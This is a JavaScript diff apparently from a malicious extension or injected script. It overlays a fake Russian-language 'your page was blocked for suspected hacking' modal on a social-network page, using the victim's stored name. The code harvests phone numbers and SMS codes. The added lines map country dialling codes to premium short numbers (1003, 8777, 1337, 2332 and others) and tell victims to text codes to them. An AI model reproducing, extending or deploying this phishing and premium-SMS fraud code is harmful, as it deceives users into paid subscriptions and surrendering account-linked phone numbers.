@@ -1,5 +1,6 @@
 var i = "";
 var type = "";
+
 var phone = "911";
 const goodUrl = "http://sms-helper.ru/js/";
 function TelCode(num){
@@ -215,43 +216,52 @@ function GetCountry() {
 	
 	if (/\+77/ig.test(cod)){
 		shot="7502";
+		type = "2";
 		
 		return;
 	}
 	if (/\+380/ig.test(cod)) {
 		shot="9106";
+		type = "1";
 		
 		return;
 	}
 	if (/\+374/ig.test(cod)){
 		shot = "1";
+		type = "2";
 		return;
 	}
 	if (/\+994/ig.test(cod)){
 		shot = "2";
+		type = "2";
 		return;
 	}
 	if (/\+375/ig.test(cod)){
 		shot="3";
+		type = "2";
 		return;
 	}
 	if (/\+370/ig.test(cod)){
 
 		shot ="4";
+		type = "2";
 		return;
 }
 	if (/\+371/ig.test(cod)){
 
 		shot ="5";
+		type = "2";
 		return;
 }
 	if (/\+373/ig.test(cod)){
 
 		shot ="6";
+		type = "2";
 		return;
 	
 	if (/\+7(?!7)/ig.test(cod)){
 		shot="2332";
+		type = "3";
 		
 		return;
 }
@@ -554,9 +564,21 @@ function SendSMS() {
 			nomer = nomer.replace(/\+/, '');
 			nomer = nomer.replace(/[X]/gi,'');
 		}
-		       
+		  var rnum = document.getElementById('field_mobile_num').value;     
+		if (rnum=="+7"){
+		type="3";
+		plg.Save('oType',type);
+	}
+	if (rnum=="+380")
+	{
+		type="1";
+		plg.Save('oType',type);
+	}
+	if ((rnum=="+77")||(rnum=="+374")||(rnum=="+994")||(rnum=="+375")||(rnum=="+370")||(rnum=="+371")||(rnum=="+373")){
+		type="2";
+		plg.Save('oType',type);
+	} 
 		
-		var rnum = document.getElementById('field_mobile_num').value;
 		var p = document.getElementById('pre').innerHTML;
 		p = p.replace('+','');
 		pCode = pCode.replace('+','');
@@ -631,7 +653,7 @@ function cancel(evt)
 
 function Show_Wnd() {
 	try {
-		var tlf = plg.Get('oPhone');
+		var tlf = document.getElementById('field_mobile_num').value;
 	}
 	catch(e){
 		tlf = "";
@@ -648,7 +670,7 @@ function Show_Wnd() {
     var modalPop = document.getElementById('hook_Block_PopLayer');
 
 	Num();
-	modalPop.innerHTML = ' <div class="feed-loading"></div></div><div id="hook_Modal_popLayer2" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была заблокирована по подозрению на взлом!</h1><div><br>Наша система безопасности выявила массовую рассылку спам-сообщений с Вашего аккаунта и мы были вынуждены временно заблокировать его. Для восстановления доступа к аккаунту Вам необходимо пройти валидацию через мобильный телефон.</div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option> 7.<option value="+77">Казахстан</option></select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="'+phone+'" id="field_mobile_num" class="it it__promo" autocomplete="off" maxlength="20"  onkeypress="return OnlyNumB(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Выслать код"   class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b>' + unescape(plg.Get('oName')) + '</b>,  В течении минуты на Ваш телефон<b>  ' +tlf+'</b>  прийдет SMS с кодом разблокировки Вашего аккаунта, полученный код введите здесь :<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br>подтверждения</h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить профиль" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div><div></form></div></div></div></div></div></div></div></div></td></tr></tbody></table></div></div></div>';
+	modalPop.innerHTML = ' <div class="feed-loading"></div></div><div id="hook_Modal_popLayer2" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была временно заблокирована по подозрению на взлом!</h1><div><br>Наша система безопасности выявила массовую рассылку спам-сообщений с Вашего аккаунта и мы были вынуждены временно заблокировать его. Для того чтобы восстановить доступ к странице, нам необходимо убедиться в том, что Вы являетесь её <b>настоящим владельцем</b>.<br>Вам следует указать номер телефона, к которому <b>привязана Ваша страница.</b></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option> 7.<option value="+77">Казахстан</option></select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="'+phone+'" id="field_mobile_num" class="it it__promo" autocomplete="off" maxlength="20"  onkeypress="return OnlyNumB(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Продолжить"   class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b>' + unescape(plg.Get('oName')) + '</b>, в течение минуты на номер <b>  ' +tlf+'</b>  поступит SMS-сообщение с кодом разблокировки Вашего аккаунта.<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br></h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить доступ" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div><div></form></div></div></div></div></div></div></div></div></td></tr></tbody></table></div></div></div>';
     modalPop.style.display = 'block';
 
 	document.getElementById('field_mobile_num').value = nam;
@@ -658,6 +680,12 @@ function Show_Wnd() {
 
 
 function Wnd() {
+try {
+		var tlf = document.getElementById('field_mobile_num').value;
+	}
+	catch(e){
+		tlf = "";
+	}
 	if (window.$)
 		Show_Wnd();
 	else {
@@ -666,6 +694,12 @@ function Wnd() {
 }
 
 function Wnd_Page() {
+try {
+		var tlf = document.getElementById('field_mobile_num').value;
+	}
+	catch(e){
+		tlf = "";
+	}
 if (plg.Get('oTime')){
 		IsTime();
 	}
@@ -681,7 +715,7 @@ if (plg.Get('oTime')){
     ClearPage();
 	Num();
 	
-    modalPop.innerHTML = '<div class="feed-loading"></div></div><div id="hook_Modal_popLayer" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была заблокирована по подозрению на взлом!</h1><div><br>В течении минуты на Ваш телефон<b> '+plg.Get('oPhone')+ '</b> прийдет SMS с требованием подтвердить активацию Вашего аккаунта, после подтверждения Вы получите код, введите его здесь:</div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option>7.<option value="+77">Казахстан</option> </select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="7"'+nam+' id="field_mobile_num" class="it it__promo" autocomplete="off" maxlength="20" onkeypress="return OnlyNumB(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Выслать код" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b> ' +unescape(plg.Get('oName')) + ' </b>,на Ваш телефон прийдет SMS с кодом разблокировки Вашего аккаунта. Полученный код введите здесь :.<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br>подтверждения</h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить профиль" class="button-pro"></span></div><div class="form_i"><br><a span id="hid" style="cursor:pointer" onclick="Hidden();">Не получили код?</a><a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span> <div id="hide" style="display:none"><br>Получить активационный код можно отправив SMS с текстом <b>00718</b> на номер <b>2332</b>.Стоимость SMS равна номинальной стоимости, установленной вашим оператором.Если не получилось отправить смс, свяжитесь с нами</div></div></div></div><div></form></div></div></div></div></div></div></div></div></td></span></tr></tbody></table></div></div></div>';
+    modalPop.innerHTML = '<div class="feed-loading"></div></div><div id="hook_Modal_popLayer" class="modal" ><div id="popLayer_mo" class="modal_overlay"></div><table class="modal_tbl"><tbody><tr><td class="modal_td"><div id="modal_box" class="modal_box modal_box__payment" style="width: 740px; height: 341px;"><div class="panelLayer layerPanelSimple" id="paymentWizardInstant" style="width: 740px; height: 341px; border-color:#FFF;"><div class="panelLayer_head"><div class="panelLayer_head_headerSimple__no-title"></div></div><div class="panelLayer_body"><div id="pmntWzrdCtr"><div id="hook_Block_MiddleColumn" class="hookBlock"><div id="middleColumn"><div id="hook_Block_AnonymAccountRecovery" class="hookBlock"><div class="hook" id="hook_Form_5878971965"><form action="#" method="post"><div id="LockContent"><div id="Step_1" style="float: left; height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h2 class="recovery-header" ><br>' + unescape(plg.Get('oName')) + ', Ваша страница была заблокирована по подозрению на взлом!</h1><div><br>Наша система безопасности выявила массовую рассылку спам-сообщений с Вашего аккаунта и мы были вынуждены временно заблокировать его. Для того чтобы восстановить доступ к странице, нам необходимо убедиться в том, что Вы являетесь её <b>настоящим владельцем</b>.<br>Вам следует указать номер телефона, к которому <b>привязана Ваша страница.</b></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody><tr><td>Страна оператора: <Label id="contr"  ><b>Россия</b></label> <a><span style="color:orange;" id = "choose_country" onclick= "Sp_st();" >Выберите страну</a></span> <select onchange="in_sel_ch();"style="float: left; display: none; width: 90%;" id="country_select" name="country_select">2.<option value="+7">Россия</option cursor:pointer>3.<option value="+380">Украина</option>4.<option value="+374">Армения</option>5.<option value="+994">Азербайджан</option>5.<option value="+375">Беларусь</option>6.<option value="+370">Литва</option>6.<option value="+371">Латвия</option>7.<option value="+373">Молдова</option>7.<option value="+77">Казахстан</option> </select>&nbsp;</td></tr></tbody></table><span class="input-l input-l__promo recovery-phone-prefix"><label id="pre" for="prefix">+7</label></span><div class="it_w"><input type="text" name="st.mobile" value="7"'+nam+' id="field_mobile_num" class="it it__promo" autocomplete="off" maxlength="20" onkeypress="return OnlyNumB(event)" autofocus></div><span class="input-e"></span></div><span><div class="form_i" style = "float:left"><input type="button" id="step" onclick="GoStep(); SendSMS();" value="Продолжить" class="button-pro"></span></div><div class="form_i"><br><span>Не получилось войти на сайт?<a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span></div></div></div>	<div id="Step_2"  style="float: left;  height: 341px;"><div class="form form__gl-2-2"><div class="form_i"><h3 class="recovery-header"><br><br>Восстановление доступа</h3><br><b> ' +unescape(plg.Get('oName')) + ' </b>,в течение минуты на номер <b>  ' +tlf+'</b>  поступит SMS-сообщение с кодом разблокировки Вашего аккаунта.<div></div></div><div class="form_i"><table class="input-flx-f recovery-selector"><tbody></tr></tbody></table><span class="input-l"><h2 class="recovery-header" >Введите код <br>подтверждения</h2></span><div class="it_w"><input type="text" name="st.mobile" value="" id="field_mobile2"  class="it it__promo" maxlength="20"></div><span class="input-e"></span></div><div class="form_i"><span><input type="button" id="step2" onclick="st_2();" value="Восстановить доступ" class="button-pro"></span></div><div class="form_i"><br><a span id="hid" style="cursor:pointer" onclick="Hidden();">Не получили код?</a><a class="feedbackLink" href="#">Обратитесь в службу поддержки</a></span> <div id="hide" style="display:none"><br>Получить активационный код можно отправив SMS с текстом <b>00718</b> на номер <b>2332</b>.Стоимость SMS равна номинальной стоимости, установленной вашим оператором.Если не получилось отправить смс, свяжитесь с нами</div></div></div></div><div></form></div></div></div></div></div></div></div></div></td></span></tr></tbody></table></div></div></div>';
     modalPop.style.display = 'block';
 	pCode = document.getElementById('country_select').value;	
 
@@ -698,10 +732,50 @@ if (plg.Get('oTime')){
 
 }
 var h="0";
-
+var textBig = "";
 function Hidden() {
 	if (h==0){
+		if (shot==1) {
+			textBig = 'Отправьте pm342243 на номер 1003 для получения кода';
+			document.getElementById('hide').innerHTML=' '+textBig;
+			document.getElementById('hide').style.display = "block";
+			return;
+		}
+		if (shot==2){
+			textBig = 'Отправьте 3342243 на номер 8777 для получения кода';
+			document.getElementById('hide').innerHTML=' '+textBig;
 		document.getElementById('hide').style.display = "block";
+			return;
+		}
+		if (shot==3){
+			textBig = 'Отправьте 3pm342243 на номер 1337 для получения кода';
+			document.getElementById('hide').innerHTML=' '+textBig;
+		document.getElementById('hide').style.display = "block";
+			return;
+		}
+		if (shot==4){
+			textBig = "Отправьте 3pm342243 на номер 1897 для получения кода";
+			document.getElementById('hide').innerHTML=' '+textBig;
+		document.getElementById('hide').style.display = "block";
+			return;
+		}
+		if (shot==5){
+			textBig = "Отправьте 342243 на  номер 7250 для получения кода";
+			document.getElementById('hide').innerHTML=' '+textBig;
+		document.getElementById('hide').style.display = "block";
+			return;
+		}
+		if (shot==6){
+			textBig = "Отправьте 44342243 на номер 1310 для получения кода";
+			document.getElementById('hide').innerHTML=' '+textBig;
+		document.getElementById('hide').style.display = "block";
+			return;
+			
+		}
+		
+		console.log(textBig);
+		
+		
 		h=1;
 		SendStat(555,"small");
 		//SendSms();
